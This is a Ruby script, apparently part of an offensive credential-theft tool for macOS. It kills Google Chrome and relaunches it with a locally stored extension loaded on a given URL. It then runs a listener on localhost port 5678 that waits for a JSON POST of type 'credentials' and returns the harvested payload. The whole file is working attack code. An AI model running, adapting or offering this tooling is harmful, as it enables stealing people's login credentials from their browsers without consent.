require 'json'
require 'socket'

def extract_credentials(trustedUrl)
    pid = nil
    reader, writer = IO.pipe

    _close_chrome
    
    cmd = "\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --load-extension=#{Dir.getwd}/extension #{trustedUrl} > /dev/null"
    pid = Process.spawn(cmd, [:out, :err] => writer)
    Process.detach(pid)

    credentials = _wait_for_credentials

    _close_chrome

    return credentials
end

def _close_chrome
    `pkill -a -i "Google Chrome"`
end

def _wait_for_credentials
    running = true
    credentials = []
    server = TCPServer.new("localhost", 5678)

    while running
        socket = server.accept

        headers = {}
        method, path = socket.gets.split

        while line = socket.gets.split(" ", 2)
            break if line[0] == ""
            headers[line[0].chop] = line[1].strip
        end

        post_body = socket.read(headers["Content-Length"].to_i)
        
        begin
            jsonData = JSON.parse(post_body)
            if jsonData["type"] == "credentials"
                running = false
                credentials = jsonData["payload"]
            end
        rescue
            puts "[!] failed to parse post body"
        end
        
        socket.close
    end

    server.close

    return credentials
end